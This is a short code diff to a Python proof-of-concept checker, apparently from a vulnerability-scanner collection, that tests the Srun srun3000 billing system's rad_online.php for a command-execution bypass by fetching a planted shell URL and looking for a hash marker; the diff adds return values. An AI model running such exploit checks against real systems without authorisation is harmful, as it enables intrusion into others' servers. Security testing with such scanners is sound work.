@@ -32,11 +32,14 @@ class srun_rad_online_bypass_rce_BaseVerify:
             req2 = requests.get(shellurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
                 cprint("[+]存在深澜软件srun3000计费系统rad_online.php命令执行bypass漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl, "red")
+                return True, vulnurl, "深澜软件srun3000计费系统rad_online.php命令执行bypass", str(payload), req.text
             else:
                 cprint("[-]不存在srun_rad_online_bypass_rce漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
